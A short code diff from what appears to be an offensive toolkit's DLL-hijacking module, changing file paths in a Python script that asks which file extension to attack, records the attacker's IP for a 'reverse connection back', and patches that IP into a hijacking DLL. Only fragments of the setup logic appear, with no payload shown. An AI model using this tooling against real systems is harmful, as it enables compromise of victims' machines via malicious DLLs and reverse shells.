@@ -25,7 +25,7 @@ except ImportError as error:
 print(dll_hijacker_text)
 
 # open the repository, its simple name,extension,dll
-fileopen = open(setdir + "/src/webattack/dll_hijacking/repository", "r")
+fileopen = open("src/webattack/dll_hijacking/repository", "r")
 
 # set base counter for our pick
 print("   Enter the choice of the file extension you want to attack:\n")
@@ -48,7 +48,7 @@ choice = int(choice)
 
 # reset the counter and get our payload ready and selected
 counter = 1
-fileopen = open(setdir + "/src/webattack/dll_hijacking/repository", "r")
+fileopen = open("src/webattack/dll_hijacking/repository", "r")
 for line in fileopen:
     line = line.split(",")
     if int(counter) == int(choice):
@@ -79,7 +79,7 @@ else:
     update_options("IPADDR=" + ipaddr)
 
 # replace ipaddress with one that we need for reverse connection back
-fileopen = open(setdir + "/src/webattack/dll_hijacking/hijacking.dll", "rb")
+fileopen = open("src/webattack/dll_hijacking/hijacking.dll", "rb")
 data = fileopen.read()
 
 filewrite = open(setdir + "/dll/%s" % (dll), "wb")
